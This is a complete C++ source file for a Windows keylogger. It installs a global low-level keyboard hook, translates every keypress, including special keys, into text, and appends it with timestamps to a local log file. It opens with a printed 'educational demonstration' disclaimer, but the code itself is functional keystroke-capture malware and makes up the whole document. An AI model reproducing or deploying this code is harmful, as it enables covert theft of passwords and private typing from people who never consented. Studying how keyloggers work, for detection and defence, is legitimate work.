#include <iostream>
#include <fstream>
#include <windows.h>  // Windows-specific header for keyboard hooks
#include <string>
#include <ctime>

// Global file for logging
std::ofstream logFile;

// This callback function is called when a key is pressed
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    // Only proceed if a key is pressed (WM_KEYDOWN)
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        // Cast lParam to keyboard struct
        KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;

        // Get the virtual key code
        DWORD vkCode = kbStruct->vkCode;

        // Open log file if not already open
        if (!logFile.is_open()) {
            logFile.open("keylog.txt", std::ios::app);
        }

        // Get current time
        time_t now = time(0);
        std::string timestamp = ctime(&now);
        timestamp.pop_back();  // Remove the newline

        // Convert virtual key code to character/string representation
        std::string keyName;

        // Handle special keys
        switch (vkCode) {
            case VK_RETURN:
                keyName = "[ENTER]";
                break;
            case VK_BACK:
                keyName = "[BACKSPACE]";
                break;
            case VK_SPACE:
                keyName = "[SPACE]";
                break;
            case VK_TAB:
                keyName = "[TAB]";
                break;
            case VK_SHIFT:
            case VK_LSHIFT:
            case VK_RSHIFT:
                keyName = "[SHIFT]";
                break;
            case VK_CONTROL:
            case VK_LCONTROL:
            case VK_RCONTROL:
                keyName = "[CTRL]";
                break;
            case VK_ESCAPE:
                keyName = "[ESC]";
                break;
            case VK_END:
                keyName = "[END]";
                break;
            case VK_HOME:
                keyName = "[HOME]";
                break;
            case VK_LEFT:
                keyName = "[LEFT]";
                break;
            case VK_UP:
                keyName = "[UP]";
                break;
            case VK_RIGHT:
                keyName = "[RIGHT]";
                break;
            case VK_DOWN:
                keyName = "[DOWN]";
                break;
            case VK_DELETE:
                keyName = "[DEL]";
                break;
            default:
                // For regular keys, get the character
                BYTE keyboardState[256];
                GetKeyboardState(keyboardState);

                // Buffer for the character
                WCHAR buffer[5] = {0};

                // Convert virtual key to character
                int result = ToUnicodeEx(vkCode, kbStruct->scanCode, keyboardState, buffer, 4, 0, NULL);

                if (result > 0) {
                    // Convert wide char to regular string
                    char ch[5] = {0};
                    WideCharToMultiByte(CP_ACP, 0, buffer, -1, ch, 5, NULL, NULL);
                    keyName = ch;
                } else {
                    // If we couldn't get the character, use the virtual key code
                    keyName = "[Key:" + std::to_string(vkCode) + "]";
                }
                break;
        }

        // Log the key with timestamp
        logFile << timestamp << " - Key: " << keyName << std::endl;
        logFile.flush();  // Ensure data is written immediately
    }

    // Call the next hook in the chain
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    // Display educational disclaimer
    std::cout << "==================================================" << std::endl;
    std::cout << "EDUCATIONAL KEYLOGGER DEMONSTRATION" << std::endl;
    std::cout << "This program demonstrates how keyloggers work." << std::endl;
    std::cout << "Using this software to record keystrokes without" << std::endl;
    std::cout << "explicit consent is illegal and unethical." << std::endl;
    std::cout << "==================================================" << std::endl;
    std::cout << "Press Ctrl+C to exit the program." << std::endl;

    // Install keyboard hook
    HHOOK keyboardHook = SetWindowsHookEx(
        WH_KEYBOARD_LL,     // Low-level keyboard hook
        KeyboardProc,       // Callback function
        GetModuleHandle(NULL),  // Current module instance
        0                   // Hook all threads
    );

    if (keyboardHook == NULL) {
        std::cerr << "Failed to install keyboard hook!" << std::endl;
        return 1;
    }

    // Open log file
    logFile.open("keylog.txt", std::ios::app);
    if (!logFile.is_open()) {
        std::cerr << "Failed to open log file!" << std::endl;
        UnhookWindowsHookEx(keyboardHook);
        return 1;
    }

    // Log the start time
    time_t now = time(0);
    logFile << "=== Keylogger started at " << ctime(&now);
    logFile.flush();

    // Message loop to keep the program running
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Clean up
    UnhookWindowsHookEx(keyboardHook);
    if (logFile.is_open()) {
        now = time(0);
        logFile << "=== Keylogger stopped at " << ctime(&now);
        logFile.close();
    }

    return 0;
}
